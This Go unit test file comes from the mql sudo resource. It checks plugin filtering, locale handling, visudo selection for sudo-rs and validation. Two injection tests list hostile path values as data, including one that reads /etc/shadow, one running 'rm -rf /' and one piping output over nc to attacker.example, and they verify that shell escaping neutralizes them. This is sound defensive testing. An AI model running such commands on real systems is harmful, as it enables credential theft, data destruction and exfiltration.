// Copyright Mondoo, Inc. 2024, 2026
// SPDX-License-Identifier: BUSL-1.1

package resources

import (
	"bytes"
	"strings"
	"testing"

	"github.com/spf13/afero"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.mondoo.com/mql/llx"
	"go.mondoo.com/mql/providers-sdk/v1/inventory"
	"go.mondoo.com/mql/providers-sdk/v1/plugin"
	"go.mondoo.com/mql/providers/os/connection/mock"
	"go.mondoo.com/mql/providers/os/connection/shared"
	"go.mondoo.com/mql/utils/syncx"
)

// newPluginRes builds a mqlSudoPlugin instance directly for unit testing.
// Bypasses CreateResource so these tests run without a runtime.
func newPluginRes(name, pluginType string) *mqlSudoPlugin {
	return &mqlSudoPlugin{
		Name: plugin.TValue[string]{Data: name, State: plugin.StateIsSet},
		Type: plugin.TValue[string]{Data: pluginType, State: plugin.StateIsSet},
	}
}

func TestPluginsOfType_FiltersByType(t *testing.T) {
	all := []any{
		newPluginRes("sudoers_io", "io"),
		newPluginRes("sudoers_policy", "policy"),
		newPluginRes("python_io", "io"),
		newPluginRes("sudoers_audit", "audit"),
	}

	io := pluginsOfType(all, "io")
	assert.Len(t, io, 2)
	assert.Equal(t, "sudoers_io", io[0].(*mqlSudoPlugin).Name.Data)
	assert.Equal(t, "python_io", io[1].(*mqlSudoPlugin).Name.Data)

	assert.Len(t, pluginsOfType(all, "policy"), 1)
	assert.Len(t, pluginsOfType(all, "audit"), 1)
}

func TestPluginsOfType_EmptyWhenNoMatch(t *testing.T) {
	all := []any{
		newPluginRes("sudoers_policy", "policy"),
	}
	got := pluginsOfType(all, "approval")
	assert.NotNil(t, got, "should be empty slice, never nil — MQL distinguishes [] from null")
	assert.Empty(t, got)
}

func TestPluginsOfType_EmptyInput(t *testing.T) {
	got := pluginsOfType([]any{}, "io")
	assert.NotNil(t, got)
	assert.Empty(t, got)
}

func TestBuildSudoVCommand_SafePaths(t *testing.T) {
	cases := map[string]string{
		"/usr/bin/sudo":          "env LC_ALL=C /usr/bin/sudo -V",
		"/usr/local/bin/sudo":    "env LC_ALL=C /usr/local/bin/sudo -V",
		"/opt/freeware/bin/sudo": "env LC_ALL=C /opt/freeware/bin/sudo -V",
	}
	for in, want := range cases {
		t.Run(in, func(t *testing.T) {
			assert.Equal(t, want, buildSudoVCommand(in))
		})
	}
}

func TestBuildSudoVCommand_EscapesInjection(t *testing.T) {
	// Each input here is what an attacker might pass via init(path: ...).
	// The output must not allow the trailing payload to execute as a
	// separate command. We don't assert exact strings (escaping is
	// implementation detail of shared.ShellEscape), only that the
	// dangerous metacharacter ends up inside a quoted region.
	maliciousPaths := []string{
		"/tmp/evil; cat /etc/shadow",
		"/tmp/evil && rm -rf /",
		"/tmp/evil | nc attacker.example 4444",
		"/tmp/evil`cat /etc/shadow`",
		"/tmp/evil$(cat /etc/shadow)",
		"/tmp/evil > /tmp/leak",
		"/tmp/sudo with spaces",
	}
	for _, p := range maliciousPaths {
		t.Run(p, func(t *testing.T) {
			cmd := buildSudoVCommand(p)
			// The command must end with " -V" exactly — anything after
			// the escaped path is appended literally by our code.
			assert.True(t, strings.HasSuffix(cmd, " -V"),
				"command %q must end with literal ' -V'", cmd)
			// The dangerous payload must not appear unquoted: the
			// escape function wraps strings containing metacharacters
			// in single quotes.
			assert.True(t, strings.HasPrefix(cmd, "env LC_ALL=C '"),
				"command %q must start with a quote to neutralize injection", cmd)
		})
	}
}

func TestBuildSudoVCommand_Empty(t *testing.T) {
	// Empty path is escaped to '' so the resulting command is harmless.
	assert.Equal(t, "env LC_ALL=C '' -V", buildSudoVCommand(""))
}

// sudoTestConn is a minimal shared.Connection that exposes a controllable
// in-memory filesystem for installed() tests. RunCommand is not invoked
// by installed(), so it's stubbed.
type sudoTestConn struct {
	fs afero.Fs
}

func (c *sudoTestConn) ID() uint32                                 { return 0 }
func (c *sudoTestConn) ParentID() uint32                           { return 0 }
func (c *sudoTestConn) RunCommand(string) (*shared.Command, error) { return nil, nil }
func (c *sudoTestConn) FileInfo(string) (shared.FileInfoDetails, error) {
	return shared.FileInfoDetails{}, nil
}
func (c *sudoTestConn) FileSystem() afero.Fs              { return c.fs }
func (c *sudoTestConn) Name() string                      { return "sudo-test" }
func (c *sudoTestConn) Type() shared.ConnectionType       { return "mock" }
func (c *sudoTestConn) Asset() *inventory.Asset           { return &inventory.Asset{} }
func (c *sudoTestConn) UpdateAsset(*inventory.Asset)      {}
func (c *sudoTestConn) Capabilities() shared.Capabilities { return shared.Capability_RunCommand }

// newSudoResource builds a mqlSudo wired to an in-memory filesystem
// containing the given paths. Each path is created as a regular file
// so afero.Exists reports it as present.
func newSudoResource(t *testing.T, existingFiles ...string) *mqlSudo {
	t.Helper()
	fs := afero.NewMemMapFs()
	for _, p := range existingFiles {
		require.NoError(t, afero.WriteFile(fs, p, []byte("sudo binary"), 0o755))
	}
	return &mqlSudo{
		MqlRuntime: &plugin.Runtime{
			Connection: &sudoTestConn{fs: fs},
		},
	}
}

func TestInstalled_FalseWhenPathUnset(t *testing.T) {
	// No init args, no auto-detection: installed must be false.
	s := newSudoResource(t)
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: ""}

	got, err := s.installed()
	require.NoError(t, err)
	assert.False(t, got, "empty Path should yield installed=false")
}

func TestInstalled_TrueWhenPathExistsOnDisk(t *testing.T) {
	// Real binary at the resolved path.
	s := newSudoResource(t, "/usr/bin/sudo")
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: "/usr/bin/sudo"}

	got, err := s.installed()
	require.NoError(t, err)
	assert.True(t, got)
}

func TestInstalled_FalseWhenInitPathDoesNotExist(t *testing.T) {
	// Regression: previously installed() returned true for any non-empty
	// Path even if the file didn't exist on disk. With the fix, init(path:
	// "/tmp/doesnotexist") must surface as installed=false.
	s := newSudoResource(t) // empty filesystem
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: "/tmp/doesnotexist"}

	got, err := s.installed()
	require.NoError(t, err)
	assert.False(t, got, "non-existent init-supplied path must report installed=false")
}

func TestInstalled_FalseWhenInitPathInjectionAttempt(t *testing.T) {
	// Defense-in-depth: even if an attacker supplies a path with shell
	// metacharacters via init(), installed() must check the literal
	// filename — not interpret the string as a shell command.
	s := newSudoResource(t, "/usr/bin/sudo") // benign sudo present
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: "/tmp/evil; cat /etc/shadow"}

	got, err := s.installed()
	require.NoError(t, err)
	assert.False(t, got, "literal lookup of malicious path must fail when no such file exists")
}

// sudoBuiltinConn answers commands the way a host does when every command
// line is run as `sudo <line>`: sudo executes the first word as a program,
// so the shell builtin `command` is not found, while `sh -c` runs it.
type sudoBuiltinConn struct {
	shared.Connection
	answers map[string]string
}

func (c *sudoBuiltinConn) RunCommand(command string) (*shared.Command, error) {
	res := &shared.Command{Command: command, Stdout: &bytes.Buffer{}, Stderr: &bytes.Buffer{}}
	if out, ok := c.answers[command]; ok {
		res.Stdout = bytes.NewBufferString(out)
		return res, nil
	}
	res.Stderr = bytes.NewBufferString("sudo: " + strings.Fields(command)[0] + ": command not found\n")
	res.ExitStatus = 1
	return res, nil
}

func TestLookupViaCommandUnderSudo(t *testing.T) {
	conn := &sudoBuiltinConn{answers: map[string]string{
		"sh -c 'command -v visudo'": "/usr/local/sbin/visudo\n",
	}}
	assert.Equal(t, "/usr/local/sbin/visudo", lookupViaCommand(conn, "visudo"))
	assert.Equal(t, "", lookupViaCommand(conn, "sudo"), "not on PATH")
}

// Output of sudo 1.9.15p5 on Ubuntu 24.04, run as a non-root user, in the C
// locale and with LANG/LC_ALL=de_DE.UTF-8.
const (
	sudoVOutputC = `Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
`
	sudoVOutputDE = `Sudo-Version 1.9.15p5
Sudoers-Policy-Plugin Version 1.9.15p5
sudoers-Dateigrammatik Version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
`
	visudoNonRootC  = "visudo: unable to open /etc/sudoers: Permission denied\n"
	visudoNonRootDE = "visudo: Die Datei »/etc/sudoers« kann nicht geöffnet werden: Keine Berechtigung\n"
)

// germanLocaleConn answers like a host whose environment sets a German
// locale: a command prints English only when it runs under LC_ALL=C.
type germanLocaleConn struct {
	sudoTestConn
}

func (c *germanLocaleConn) RunCommand(command string) (*shared.Command, error) {
	res := &shared.Command{Command: command, Stdout: &bytes.Buffer{}, Stderr: &bytes.Buffer{}}
	cLocale := strings.HasPrefix(command, "env LC_ALL=C ")
	switch {
	case strings.HasSuffix(command, "/usr/bin/sudo -V"):
		out := sudoVOutputDE
		if cLocale {
			out = sudoVOutputC
		}
		res.Stdout = bytes.NewBufferString(out)
	case strings.HasSuffix(command, "/usr/sbin/visudo -c"):
		out := visudoNonRootDE
		if cLocale {
			out = visudoNonRootC
		}
		res.Stderr = bytes.NewBufferString(out)
		res.ExitStatus = 1
	default:
		res.ExitStatus = 127
	}
	return res, nil
}

func newGermanLocaleSudo(t *testing.T) *mqlSudo {
	t.Helper()
	fs := afero.NewMemMapFs()
	for _, p := range []string{"/usr/bin/sudo", "/usr/sbin/visudo"} {
		require.NoError(t, afero.WriteFile(fs, p, []byte("binary"), 0o755))
	}
	runtime := &plugin.Runtime{
		Connection: &germanLocaleConn{sudoTestConn{fs: fs}},
		Resources:  &syncx.Map[plugin.Resource]{},
	}
	res, err := NewResource(runtime, "sudo", map[string]*llx.RawData{})
	require.NoError(t, err)
	return res.(*mqlSudo)
}

func TestSudoVersionUnderGermanLocale(t *testing.T) {
	s := newGermanLocaleSudo(t)

	version := s.GetVersion()
	require.NoError(t, version.Error)
	assert.Equal(t, "1.9.15p5", version.Data)

	impl := s.GetImplementation()
	require.NoError(t, impl.Error)
	assert.Equal(t, "sudo", impl.Data)

	policy := s.GetPolicyPlugin()
	require.NoError(t, policy.Error)
	require.NotNil(t, policy.Data)
	assert.Equal(t, "sudoers_policy", policy.Data.Name.Data)
}

// visudo -c as a non-root user cannot read /etc/sudoers. That is "could not
// check", not "sudoers is invalid".
func TestSudoValidateUnderGermanLocaleNonRoot(t *testing.T) {
	s := newGermanLocaleSudo(t)

	validate := s.GetValidate()
	require.NoError(t, validate.Error)
	assert.True(t, validate.IsNull())
	assert.Nil(t, validate.Data)
}

// Debian 13 installs sudo-rs next to the C sudo: /usr/bin/sudo-rs and
// /usr/bin/visudo-rs link to /usr/lib/cargo/bin/{sudo,visudo}, while
// /usr/bin/sudo and /usr/sbin/visudo stay the C implementation.
var debian13SudoFiles = []string{
	"/usr/bin/sudo",
	"/usr/sbin/visudo",
	"/usr/bin/sudo-rs",
	"/usr/bin/visudo-rs",
	"/usr/lib/cargo/bin/sudo",
	"/usr/lib/cargo/bin/visudo",
}

func TestVisudoForSudo(t *testing.T) {
	fs := afero.NewMemMapFs()
	for _, p := range append(debian13SudoFiles, "/usr/local/bin/sudo", "/usr/local/sbin/visudo", "/opt/sudo/mysudo", "/usr/sbin/sudo") {
		require.NoError(t, afero.WriteFile(fs, p, []byte{}, 0o755))
	}
	afs := &afero.Afero{Fs: fs}

	tests := map[string]string{
		"/usr/bin/sudo-rs":        "/usr/bin/visudo-rs",
		"/usr/bin/sudo":           "/usr/sbin/visudo",
		"/usr/lib/cargo/bin/sudo": "/usr/lib/cargo/bin/visudo",
		"/usr/local/bin/sudo":     "/usr/local/sbin/visudo",
		"/opt/sudo/mysudo":        "",
		"/usr/sbin/sudo":          "/usr/sbin/visudo",
	}
	for sudoPath, want := range tests {
		t.Run(sudoPath, func(t *testing.T) {
			assert.Equal(t, want, visudoForSudo(afs, sudoPath))
		})
	}
}

// `visudo-rs -c` on Debian 13 (sudo-rs 0.2.5) for a sudoers.d file that the
// C visudo accepts
const visudoRsStderr = `/etc/sudoers.d/mqltest:7:21: syntax error: 'requiretty' cannot be used in a boolean context
Defaults:mqlt_bash !requiretty
                    ^~~~~~~~~~
/etc/sudoers.d/mqltest:8:20: syntax error: unknown setting: 'logfile'
Defaults@localhost logfile=/var/log/sudo-mql.log
                   ^~~~~~~
visudo: invalid sudoers file
`

const visudoCOK = `/etc/sudoers: parsed OK
/etc/sudoers.d/mqltest: parsed OK
`

func sudoValidateRuntime(t *testing.T, files []string) *plugin.Runtime {
	t.Helper()
	mockFiles := map[string]*mock.MockFileData{}
	for _, p := range files {
		mockFiles[p] = &mock.MockFileData{Path: p, Content: "binary"}
	}
	conn, err := mock.New(0, &inventory.Asset{Platform: &inventory.Platform{
		Name:   "debian",
		Family: []string{"debian", "linux", "unix", "os"},
	}}, mock.WithData(&mock.TomlData{
		Files: mockFiles,
		Commands: map[string]*mock.Command{
			"/usr/sbin/visudo -c":   {Command: "/usr/sbin/visudo -c", Stdout: visudoCOK},
			"/usr/bin/visudo-rs -c": {Command: "/usr/bin/visudo-rs -c", Stderr: visudoRsStderr, ExitStatus: 1},
		},
	}))
	require.NoError(t, err)
	return &plugin.Runtime{Connection: conn, Resources: &syncx.Map[plugin.Resource]{}}
}

func TestSudoValidateUsesTheImplementationsVisudo(t *testing.T) {
	runtime := sudoValidateRuntime(t, debian13SudoFiles)

	cSudo, err := NewResource(runtime, "sudo", map[string]*llx.RawData{})
	require.NoError(t, err)
	rsSudo, err := NewResource(runtime, "sudo", map[string]*llx.RawData{
		"path": llx.StringData("/usr/bin/sudo-rs"),
	})
	require.NoError(t, err)

	cValidate := cSudo.(*mqlSudo).GetValidate()
	require.NoError(t, cValidate.Error)
	require.NotNil(t, cValidate.Data)
	assert.True(t, cValidate.Data.Valid.Data)

	rsValidate := rsSudo.(*mqlSudo).GetValidate()
	require.NoError(t, rsValidate.Error)
	require.NotNil(t, rsValidate.Data)
	assert.False(t, rsValidate.Data.Valid.Data)
	assert.NotEmpty(t, rsValidate.Data.Errors.Data)
}

func TestSudoValidateNullWhenNotInstalled(t *testing.T) {
	runtime := sudoValidateRuntime(t, debian13SudoFiles)

	res, err := NewResource(runtime, "sudo", map[string]*llx.RawData{
		"path": llx.StringData("/usr/local/bin/nosuchsudo"),
	})
	require.NoError(t, err)
	validate := res.(*mqlSudo).GetValidate()
	require.NoError(t, validate.Error)
	assert.Nil(t, validate.Data)
	assert.True(t, validate.IsNull())
}

// A sudo outside the conventional locations without its own visudo has no
// validator: some other visudo on the system may belong to another
// implementation.
func TestSudoValidateNullWithoutSiblingVisudo(t *testing.T) {
	runtime := sudoValidateRuntime(t, append(debian13SudoFiles, "/opt/sudo/bin/sudo"))

	res, err := NewResource(runtime, "sudo", map[string]*llx.RawData{
		"path": llx.StringData("/opt/sudo/bin/sudo"),
	})
	require.NoError(t, err)
	validate := res.(*mqlSudo).GetValidate()
	require.NoError(t, validate.Error)
	assert.True(t, validate.IsNull())
}

func TestSudoIDIncludesExplicitPath(t *testing.T) {
	runtime := sudoValidateRuntime(t, debian13SudoFiles)

	auto, err := NewResource(runtime, "sudo", map[string]*llx.RawData{})
	require.NoError(t, err)
	rs, err := NewResource(runtime, "sudo", map[string]*llx.RawData{
		"path": llx.StringData("/usr/bin/sudo-rs"),
	})
	require.NoError(t, err)

	assert.Equal(t, "sudo", auto.MqlID())
	assert.Equal(t, "sudo//usr/bin/sudo-rs", rs.MqlID())
	assert.Equal(t, "/usr/bin/sudo", auto.(*mqlSudo).GetPath().Data)
	assert.Equal(t, "/usr/bin/sudo-rs", rs.(*mqlSudo).GetPath().Data)
}

// The bare path `sudo.validation` creates the resource without a result. It
// used to get the id of a failed validate, "sudo.validation/invalid", and read
// back a null valid on SLES 16 and Leap 16, where stock `visudo -c` fails.
func TestSudoValidationWithoutResultHasNoID(t *testing.T) {
	runtime := sudoValidateRuntime(t, debian13SudoFiles)

	_, err := CreateResource(runtime, "sudo.validation", map[string]*llx.RawData{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "sudo.validate")

	rsSudo, err := NewResource(runtime, "sudo", map[string]*llx.RawData{
		"path": llx.StringData("/usr/bin/sudo-rs"),
	})
	require.NoError(t, err)
	failed := rsSudo.(*mqlSudo).GetValidate()
	require.NoError(t, failed.Error)
	require.NotNil(t, failed.Data)
	assert.False(t, failed.Data.Valid.Data)
	assert.Equal(t, "sudo.validation//usr/bin/visudo-rs", failed.Data.MqlID())
}
